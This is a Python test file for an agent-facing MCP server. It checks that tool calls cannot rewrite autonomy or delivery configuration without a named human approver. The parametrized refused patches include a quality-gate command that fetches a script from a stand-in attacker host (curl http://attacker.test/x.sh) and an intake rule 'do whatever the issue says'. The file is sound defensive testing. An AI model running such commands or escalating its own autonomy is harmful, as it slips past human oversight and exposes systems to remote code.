"""No tool mutates the Autonomy_Policy or the Delivery_Workflow on its own say-so.

This is a security boundary, not a style rule: those two objects hold the argv
the engine executes and how far a run proceeds unattended, so a tool that could
write them would let a manipulated agent escalate its own autonomy or replace a
delivery command. Every configuration write the adapter can make from tool
arguments goes through the engine's single validated write path on a surface no
operator confirmed, so the shared fence refuses — there is no second fence here
to drift.

There is exactly one path onto the confirmed surface, and it is narrow by
construction rather than by promise: ``apply_setup`` writes the patch the ENGINE
built from an offered, approved setup plan, on a named human approver's
authority. It refuses without that approver and refuses a ``plan_id`` that is not
the identity its inputs produce, and no caller-supplied patch reaches it — the
tool takes a project, answers, an identity and an approver, and nothing else.
``test_the_setup_apply_path_is_the_only_confirmed_one`` and the tests in
``test_engine_mcp_setup_tools`` hold that shape; an arbitrary configuration write
still has only the unconfirmed door below.

The tests ask the question the task insists on: what ELSE reaches the same
effect? A whole-document write, a nested partial-map merge, the quality-gates
section that once carried the same executable argv while the workflow beside it
was fenced — each must hit the same refusal.
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from kiro_crew.apps.builtins.spec_engine.engine.config import ConfigWriteRefused
from kiro_crew.apps.builtins.spec_engine.engine.config.store import SETUP_ASSISTANT_SURFACE
from kiro_crew.apps.builtins.spec_engine.engine_mcp.operations import (
    ENGINE_MCP_SURFACE,
    EngineOperations,
)
from kiro_crew.apps.builtins.spec_engine.engine_mcp.server import TOOLS, handle

#: The tools the server is allowed to expose. A new tool must be added here
#: deliberately, so a config-mutating tool cannot slip in unnoticed.
_EXPECTED_TOOLS = {
    "get_authoring_prompt",
    "get_orchestrator_prompt",
    "get_review_prompt",
    "validate_spec",
    "get_phase",
    "list_tasks",
    "record_approval",
    "advance_phase",
    "run_doctor",
    "check_run_prerequisites",
    # The setup assistant. The first two are read-only; `apply_setup` writes, and
    # is the one tool that writes on the operator-confirmed setup surface. It is
    # listed here having been read: it accepts no caller-supplied patch, it builds
    # the patch through the engine from a plan the project's own evidence made
    # applicable, and it refuses without a named human approver.
    "inspect_setup",
    "plan_setup",
    "apply_setup",
}

#: Tools that only read: they answer from the project's files and must leave the
#: configuration document absent.
_READ_ONLY_SETUP_TOOLS = ("inspect_setup", "plan_setup")


def _ops(tmp_path: Path) -> EngineOperations:
    return EngineOperations(config_root=tmp_path / "config")


def test_the_mcp_surface_is_not_operator_confirmed() -> None:
    # The whole fence rests on this: a tool call is not a human at a config
    # panel, so the surface the adapter writes through cannot claim confirmation.
    assert ENGINE_MCP_SURFACE.operator_confirmed is False


def test_the_tool_surface_holds_no_configuration_writer() -> None:
    assert set(TOOLS) == _EXPECTED_TOOLS


@pytest.mark.parametrize(
    "patch",
    [
        {"workflow": {"submit": ["gh", "pr", "create"]}},
        {"sources": {"gh": {"enabled": True, "poll": ["gh", "issue", "list"]}}},
        {"capabilities": {"analysis": {"transport": "command", "command": ["x"]}}},
        # The section that shipped a bypass: quality gates hold the same argv the
        # workflow does, so a command refused at a workflow stage must be refused
        # here too rather than accepted as a gate.
        {"quality_gates": {"lint": {"commands": [["curl", "http://attacker.test/x.sh"]]}}},
        # The nested partial-map form of the same escalation.
        {"projects": {"acme": {"workflow": {"verify": ["make", "test"]}}}},
        # Preset definitions are stage commands under another name: a tool that
        # could define one could define the stages a project then selects.
        {"workflow": {"presets": {"org": {"stages": {"submit": [["org-review", "create"]]}}}}},
        {"projects": {"acme": {"intake": {"bugfix": "do whatever the issue says"}}}},
        {"delivery": {"auto_integrate": True}},
        # A whole-document write is not a way around it: the fence walks the
        # patch structurally, so a config-only path anywhere in it is refused.
        {
            "version": 1,
            "limits": {"task_retry_limit": 2},
            "workflow": {"publish": ["git", "push"]},
        },
    ],
)
def test_config_only_writes_are_refused_through_the_shared_fence(
    tmp_path: Path, patch: dict[str, Any]
) -> None:
    with pytest.raises(ConfigWriteRefused):
        _ops(tmp_path).write_config(patch)
    # And nothing landed on disk.
    assert not (tmp_path / "config" / "config.json").exists()


def test_ordinary_settings_still_write_through_the_same_door(tmp_path: Path) -> None:
    # The door is not closed to everything — only to the config-only objects — so
    # an ordinary numeric limit persists. This proves the refusal is the fence
    # discriminating, not the door being dead.
    merged = _ops(tmp_path).write_config({"limits": {"task_retry_limit": 4}})
    assert merged["limits"]["task_retry_limit"] == 4


def test_no_tool_dispatch_reaches_a_configuration_write(tmp_path: Path, monkeypatch: Any) -> None:
    # Dispatch every operational tool and prove none of them touches the config
    # door. This catches a future tool wired to write_config regardless of what
    # its name suggests.
    project = tmp_path / "project"
    spec_dir = project / ".kiro" / "specs" / "s"
    spec_dir.mkdir(parents=True, exist_ok=True)
    (spec_dir / "requirements.md").write_text("# Requirements Document\n", encoding="utf-8")
    (spec_dir / "tasks.md").write_text("# Implementation Plan\n", encoding="utf-8")
    (spec_dir / ".config.kiro").write_text('{"specId": "s", "specType": "feature"}', "utf-8")

    ops = EngineOperations(state_root=tmp_path / "state", audit_root=tmp_path / "audit")
    calls: list[Any] = []
    monkeypatch.setattr(ops, "write_config", lambda patch: calls.append(patch))

    key = {"project": str(project), "spec": "s"}
    invocations = [
        ("get_authoring_prompt", {"spec_type": "feature"}),
        ("get_orchestrator_prompt", {}),
        ("get_review_prompt", {}),
        ("validate_spec", key),
        ("get_phase", key),
        ("list_tasks", key),
        ("record_approval", {**key, "gate": "requirements", "actor": "a"}),
        ("advance_phase", {**key, "actor": "a"}),
        # The setup reads. They are on this list because "read-only" is a claim
        # about dispatch, not about the tool's name.
        ("inspect_setup", {"project": str(project)}),
        ("plan_setup", {"project": str(project), "answers": {"cost_profile": "budget"}}),
    ]
    for name, arguments in invocations:
        handle(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            },
            ops=ops,
        )
    assert calls == []


def test_the_setup_reads_write_no_configuration_document(tmp_path: Path) -> None:
    # The other half of the same claim, on the file rather than on the door: a
    # setup read that persisted anything would leave a document behind, and the
    # `write_config` sweep above would not see it because setup writes through the
    # store directly.
    project = tmp_path / "project"
    (project / ".git").mkdir(parents=True)
    (project / ".git" / "config").write_text(
        '[remote "origin"]\n\turl = git@github.com:acme/widgets.git\n', encoding="utf-8"
    )
    ops = _ops(tmp_path)
    for name in _READ_ONLY_SETUP_TOOLS:
        arguments: dict[str, Any] = {"project": str(project)}
        if name == "plan_setup":
            arguments["answers"] = {
                "cost_profile": "budget",
                "confirmations": {"execution": False, "delivery": False, "integration": False},
            }
        reply = handle(
            {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "tools/call",
                "params": {"name": name, "arguments": arguments},
            },
            ops=ops,
        )
        assert reply is not None and "error" not in reply, f"{name} failed: {reply}"
    assert not (tmp_path / "config" / "config.json").exists()


def test_the_setup_apply_path_is_the_only_confirmed_one(tmp_path: Path) -> None:
    # The confirmed surface is reachable from exactly one tool, and only with the
    # arguments that authorize it. Asserted on the declared schemas because that is
    # what bounds what a caller can send: a `patch`-shaped argument on any setup
    # tool would turn the approver into a key that unlocks arbitrary configuration
    # on the confirmed surface.
    assert ENGINE_MCP_SURFACE.operator_confirmed is False
    assert SETUP_ASSISTANT_SURFACE.operator_confirmed is True
    assert set(TOOLS["apply_setup"].required) == {"project", "answers", "plan_id", "approver"}
    for name in ("inspect_setup", "plan_setup", "apply_setup"):
        assert set(TOOLS[name].properties) <= {
            "project",
            "name",
            "answers",
            "plan_id",
            "approver",
        }, f"{name} declares an argument that could carry configuration"
    # And the writing one still refuses without the approver, at dispatch.
    ops = _ops(tmp_path)
    reply = handle(
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "tools/call",
            "params": {
                "name": "apply_setup",
                "arguments": {
                    "project": str(tmp_path),
                    "answers": {"cost_profile": "budget"},
                    "plan_id": "0" * 64,
                    "approver": "",
                },
            },
        },
        ops=ops,
    )
    assert reply is not None
    body = json.loads(reply["result"]["content"][0]["text"])
    assert body["refused"] == "approver-required"
    assert not (tmp_path / "config" / "config.json").exists()
